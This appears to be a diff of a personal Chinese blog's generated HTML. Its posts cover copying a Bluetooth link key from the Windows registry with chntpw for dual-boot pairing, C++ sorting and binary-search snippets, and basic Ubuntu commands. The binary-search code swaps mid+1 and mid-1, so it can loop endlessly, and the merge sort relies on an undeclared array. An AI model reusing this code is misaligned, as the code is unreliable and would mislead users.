-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/18/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E8%93%9D%E7%89%99%E8%BF%9E%E6%8E%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/18/%E5%8F%8C%E7%B3%BB%E7%BB%9F%E8%93%9D%E7%89%99%E8%BF%9E%E6%8E%A5/" class="post-title-link" itemprop="url">双系统蓝牙连接</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-08-18 19:21:01" itemprop="dateCreated datePublished" datetime="2024-08-18T19:21:01+08:00">2024-08-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-19 10:07:08" itemprop="dateModified" datetime="2024-08-19T10:07:08+08:00">2024-08-19</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="蓝牙连接双系统"><a href="#蓝牙连接双系统" class="headerlink" title="蓝牙连接双系统"></a>蓝牙连接双系统</h2><h3 id="1-先两个系统都有连接过"><a href="#1-先两个系统都有连接过" class="headerlink" title="1.先两个系统都有连接过"></a>1.先两个系统都有连接过</h3><h3 id="2-确保windows能正常连接"><a href="#2-确保windows能正常连接" class="headerlink" title="2.确保windows能正常连接"></a>2.确保windows能正常连接</h3><h3 id="3-切换到ubuntu系统"><a href="#3-切换到ubuntu系统" class="headerlink" title="3.切换到ubuntu系统"></a>3.切换到ubuntu系统</h3><h3 id="4-下载chntpw和vim"><a href="#4-下载chntpw和vim" class="headerlink" title="4.下载chntpw和vim"></a>4.下载chntpw和vim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install chntpw</span><br><span class="line"><span class="built_in">sudo</span> apt install vim</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="5-找到windows的C盘"><a href="#5-找到windows的C盘" class="headerlink" title="5.找到windows的C盘"></a>5.找到windows的C盘</h3><h3 id="6-在C盘目录打开终端-进入config文件"><a href="#6-在C盘目录打开终端-进入config文件" class="headerlink" title="6.在C盘目录打开终端 进入config文件"></a>6.在C盘目录打开终端 进入config文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Windows/System32/config/</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="7-使用刚刚安装的软件"><a href="#7-使用刚刚安装的软件" class="headerlink" title="7.使用刚刚安装的软件"></a>7.使用刚刚安装的软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chntpw -e SYSTEM</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="8-进入蓝牙设备的目录"><a href="#8-进入蓝牙设备的目录" class="headerlink" title="8.进入蓝牙设备的目录"></a>8.进入蓝牙设备的目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> \ControlSet001\Services\BTHPORT\Parameters\Keys</span><br><span class="line"><span class="built_in">ls</span>		//查看key name</span><br><span class="line"><span class="built_in">cd</span> &lt;<span class="built_in">link</span> key&gt;		//把你的<span class="built_in">link</span> key替换掉&lt;<span class="built_in">link</span> key&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="9-找到你要连接双系统的蓝牙设备地址"><a href="#9-找到你要连接双系统的蓝牙设备地址" class="headerlink" title="9.找到你要连接双系统的蓝牙设备地址"></a>9.找到你要连接双系统的蓝牙设备地址</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="1-进入设置-蓝牙-点击你要连接双系统的蓝牙设备-查看地址"><a href="#1-进入设置-蓝牙-点击你要连接双系统的蓝牙设备-查看地址" class="headerlink" title="1..进入设置 蓝牙 点击你要连接双系统的蓝牙设备 查看地址"></a>1..进入设置 蓝牙 点击你要连接双系统的蓝牙设备 查看地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34:88:5D:3E:FC:87		//我的地址</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="2-回到终端-查看value-name里面和蓝牙设备相同的地址-并复制下来"><a href="#2-回到终端-查看value-name里面和蓝牙设备相同的地址-并复制下来" class="headerlink" title="2..回到终端 查看value name里面和蓝牙设备相同的地址 并复制下来"></a>2..回到终端 查看value name里面和蓝牙设备相同的地址 并复制下来</h4><h3 id="10-查看蓝牙设备的link-key"><a href="#10-查看蓝牙设备的link-key" class="headerlink" title="10.查看蓝牙设备的link key"></a>10.查看蓝牙设备的link key</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex &lt;你蓝牙的<span class="built_in">link</span> key&gt;		//把你蓝牙的<span class="built_in">link</span> key替换掉&lt;你蓝牙的<span class="built_in">link</span> key&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="输出的是"><a href="#输出的是" class="headerlink" title="输出的是"></a>输出的是</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Value &lt;34885d3efc87&gt; of type REG_BINARY (3), data length 16 [0x10]</span><br><span class="line">:00000  E1 7E CD 8D 62 3F 81 51 04 7C 59 52 6E B1 8B AC .~..b?.Q.|YRn...</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="link-key是"><a href="#link-key是" class="headerlink" title="link key是"></a>link key是</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E1 7E CD 8D 62 3F 81 51 04 7C 59 52 6E B1 8B AC		//要把得到的link key的空格删除</span><br><span class="line">E17ECD8D623F8151047C59526EB18BAC	//记住!记住!记住!复制下来 不要复制上一行 复制这一行 </span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="11-进入ubuntu系统的蓝牙目录"><a href="#11-进入ubuntu系统的蓝牙目录" class="headerlink" title="11.进入ubuntu系统的蓝牙目录"></a>11.进入ubuntu系统的蓝牙目录</h3><h4 id="再新建一个终端"><a href="#再新建一个终端" class="headerlink" title="再新建一个终端"></a>再新建一个终端</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su		//提权</span><br><span class="line"><span class="built_in">cd</span> ~&amp;&amp;<span class="built_in">cd</span> ..&amp;&amp;<span class="built_in">cd</span> ..&amp;&amp;<span class="built_in">cd</span> var/lib/bluetooth</span><br><span class="line"><span class="built_in">ls</span>		//查看系统的mac地址</span><br><span class="line"><span class="built_in">cd</span> &lt;系统的mac地址&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="12-进入你的蓝牙设备的目录"><a href="#12-进入你的蓝牙设备的目录" class="headerlink" title="12.进入你的蓝牙设备的目录"></a>12.进入你的蓝牙设备的目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;你蓝牙设备的地址&gt;		//把你蓝牙设备的地址替换掉&lt;你蓝牙的地址&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="13-修改ubuntu的link-key地址为windows的link-key地址"><a href="#13-修改ubuntu的link-key地址为windows的link-key地址" class="headerlink" title="13.修改ubuntu的link key地址为windows的link key地址"></a>13.修改ubuntu的link key地址为windows的link key地址</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim info</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-找到-LinkKey"><a href="#1-找到-LinkKey" class="headerlink" title="1.找到[LinkKey]"></a>1.找到[LinkKey]</h4><h4 id="2-下面有个-key"><a href="#2-下面有个-key" class="headerlink" title="2.下面有个 key&#x3D;"></a>2.下面有个 key&#x3D;</h4><h4 id="3-把-后面的32位linkkey地址全删除"><a href="#3-把-后面的32位linkkey地址全删除" class="headerlink" title="3.把&#x3D;后面的32位linkkey地址全删除"></a>3.把&#x3D;后面的32位linkkey地址全删除</h4><h4 id="4-替换成第10步你复制的windows的link-key地址"><a href="#4-替换成第10步你复制的windows的link-key地址" class="headerlink" title="4.替换成第10步你复制的windows的link key地址"></a>4.替换成第10步你复制的windows的link key地址</h4><h3 id="14-重启你的电脑和蓝牙"><a href="#14-重启你的电脑和蓝牙" class="headerlink" title="14.重启你的电脑和蓝牙"></a>14.重启你的电脑和蓝牙</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/10/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/10/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">二分算法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-08-10 20:21:18 / 修改时间：21:02:38" itemprop="dateCreated datePublished" datetime="2024-08-10T20:21:18+08:00">2024-08-10</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="整数二分算法"><a href="#整数二分算法" class="headerlink" title="整数二分算法"></a>整数二分算法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cheak</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;<span class="comment">/* ... */</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inthalf1</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">cheak</span>(mid))r=mid;</span><br><span class="line">        <span class="keyword">else</span> l=mid<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inthalf2</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="type">int</span> mid=l+r<span class="number">+1</span>&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">cheak</span>(mid))l=mid;</span><br><span class="line">        <span class="keyword">else</span> r=mid<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="小数二分算法"><a href="#小数二分算法" class="headerlink" title="小数二分算法"></a>小数二分算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/06/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/08/06/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/" class="post-title-link" itemprop="url">排序算法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-08-06 15:51:16" itemprop="dateCreated datePublished" datetime="2024-08-06T15:51:16+08:00">2024-08-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-10 20:21:00" itemprop="dateModified" datetime="2024-08-10T20:21:00+08:00">2024-08-10</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><h3 id="快排算法"><a href="#快排算法" class="headerlink" title="快排算法"></a>快排算法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fastsort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> i=l<span class="number">-1</span>,j=r<span class="number">+1</span>,x=q[i+j&gt;&gt;<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">do</span> i++;<span class="keyword">while</span>(q[i]&lt;x);</span><br><span class="line">        <span class="keyword">do</span> j--;<span class="keyword">while</span>(q[j]&gt;x);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)<span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fastsort</span>(q,l,j),<span class="built_in">fastsort</span>(q,j<span class="number">+1</span>,r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="归并算法"><a href="#归并算法" class="headerlink" title="归并算法"></a>归并算法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">guisort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">guisort</span>(q,l,mid);</span><br><span class="line">    <span class="built_in">guisort</span>(q,mid<span class="number">+1</span>,r);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> k=<span class="number">0</span>,i=l,j=mid<span class="number">+1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)</span><br><span class="line">        <span class="keyword">if</span>(q[i]&lt;=q[j])tmp[k++]=q[i++];</span><br><span class="line">    	<span class="keyword">else</span> tmp[k++]=q[j++];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)tmp[k++]=q[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=r)tmp[k++]=q[j++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l,j=<span class="number">0</span>;i&lt;=r;i++,j++)q[i]=tmp[j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/28/C++%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/07/28/C++%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">C++基础语法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2024-07-28 21:10:42 / 修改时间：21:10:44" itemprop="dateCreated datePublished" datetime="2024-07-28T21:10:42+08:00">2024-07-28</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/27/ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -780,13 +183,13 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
+      <meta itemprop="name" content="ubuntu基本命令 | Weicheng Gao's Blog">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/07/27/ubuntu%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" class="post-title-link" itemprop="url">ubuntu基本命令</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          ubuntu基本命令
+        </h1>
 
         <div class="post-meta-container">
           <div class="post-meta">
@@ -809,8 +212,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="1-ls命令：列出文件夹内容"><a href="#1-ls命令：列出文件夹内容" class="headerlink" title="1.ls命令：列出文件夹内容"></a>1.ls命令：列出文件夹内容</h3><p>这是 Linux 新用户首先学习的几个命令之一。此命令可让您查看当前文件夹中有哪些文件和文件夹。</p>
+    <div class="post-body" itemprop="articleBody"><h3 id="1-ls命令：列出文件夹内容"><a href="#1-ls命令：列出文件夹内容" class="headerlink" title="1.ls命令：列出文件夹内容"></a>1.ls命令：列出文件夹内容</h3><p>这是 Linux 新用户首先学习的几个命令之一。此命令可让您查看当前文件夹中有哪些文件和文件夹。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
 
 <iframe id="aswift_4" name="aswift_4" browsingtopics="true" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="1200" height="0" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allow="attribution-reporting" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-6366716774018597&amp;output=html&amp;h=280&amp;slotname=1482127509&amp;adk=2448454397&amp;adf=2738168491&amp;pi=t.ma~as.1482127509&amp;w=1200&amp;abgtt=6&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1722092303&amp;rafmt=1&amp;format=1200x280&amp;url=https%3A%2F%2Fcn.linux-console.net%2F%3Fp%3D17794%23google_vignette&amp;fwr=0&amp;fwrattr=true&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;uach=WyJMaW51eCIsIjYuOC4wIiwieDg2IiwiIiwiMTI3LjAuMjY1MS43NCIsbnVsbCwwLG51bGwsIjY0IixbWyJOb3QpQTtCcmFuZCIsIjk5LjAuMC4wIl0sWyJNaWNyb3NvZnQgRWRnZSIsIjEyNy4wLjI2NTEuNzQiXSxbIkNocm9taXVtIiwiMTI3LjAuNjUzMy43MyJdXSwwXQ..&amp;dt=1722092303102&amp;bpp=2&amp;bdt=182&amp;idt=226&amp;shv=r20240724&amp;mjsv=m202407250101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D8d19019e05d5c254%3AT%3D1721455014%3ART%3D1722092062%3AS%3DALNI_Mba7DZDA3IhpJEysdmalrFruaqT7g&amp;gpic=UID%3D00000e9c5ea832fe%3AT%3D1721455014%3ART%3D1722092062%3AS%3DALNI_Mawv_wawYQx-R29vnVgMMAi3bDSww&amp;eo_id_str=ID%3D358cf348cb64b3a5%3AT%3D1721455014%3ART%3D1722092062%3AS%3DAA-Afjbd8Sf28EpNazBXmCmQJwTu&amp;prev_fmts=0x0%2C1200x280%2C1200x200%2C1200x200&amp;nras=1&amp;correlator=3888301112051&amp;frm=20&amp;pv=1&amp;ga_vid=1033525468.1722092303&amp;ga_sid=1722092303&amp;ga_hid=453014434&amp;ga_fc=0&amp;u_tz=480&amp;u_his=2&amp;u_h=1080&amp;u_w=1920&amp;u_ah=1048&amp;u_aw=1854&amp;u_cd=24&amp;u_sd=1&amp;dmc=8&amp;adx=306&amp;ady=1698&amp;biw=1831&amp;bih=968&amp;scr_x=0&amp;scr_y=0&amp;eid=44759875%2C44759926%2C44759837%2C31085512%2C44795921%2C95333411%2C95334526%2C95334830%2C95337869%2C95338226%2C95338256%2C31085643%2C95337196%2C95336267%2C31078663%2C31078668%2C31078670&amp;oid=2&amp;pvsid=4307671725718506&amp;tmod=996264451&amp;uas=0&amp;nvt=1&amp;fc=1920&amp;brdim=66%2C32%2C66%2C32%2C1854%2C32%2C1854%2C1048%2C1846%2C968&amp;vis=1&amp;rsz=%7C%7CpEebr%7C&amp;abl=CS&amp;pfx=0&amp;fu=128&amp;bc=31&amp;bz=1&amp;psd=W251bGwsbnVsbCxudWxsLDNd&amp;nt=1&amp;ifi=5&amp;uci=a!5&amp;btvi=1&amp;fsb=1&amp;dtd=231" data-google-container-id="a!5" tabindex="0" title="Advertisement" aria-label="Advertisement" data-google-query-id="CP7yk-C9x4cDFaZeDwIdDa8qQA" data-load-complete="true" style="box-sizing: border-box; left: 0px; top: 0px; border: 0px; width: 1200px; height: 0px;"></iframe>
@@ -1071,7 +473,6 @@
 <p>对于新用户来说，理解联机帮助页可能会很困难，但它却非常方便。它为您提供命令选项的通用语法和描述。</p>
 <p>当您不确定如何使用某个命令时，请尝试先检查其手册页，然后再在互联网上搜索它。</p>
 
-      
     </div>
 
     
@@ -1079,8 +480,21 @@
     
 
     <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/07/27/liunx%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/" rel="prev" title="liunx文件权限">
+                  <i class="fa fa-angle-left"></i> liunx文件权限
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/07/28/C++%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" rel="next" title="C++基础语法">
+                  C++基础语法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
     </footer>
   </article>
 </div>
@@ -1088,167 +502,7 @@
 
 
 
-    
 
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/27/liunx%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Weicheng Gao">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Weicheng Gao's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/07/27/liunx%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/" class="post-title-link" itemprop="url">liunx文件权限</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-07-27 20:48:33" itemprop="dateCreated datePublished" datetime="2024-07-27T20:48:33+08:00">2024-07-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-08-07 15:54:20" itemprop="dateModified" datetime="2024-08-07T15:54:20+08:00">2024-08-07</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
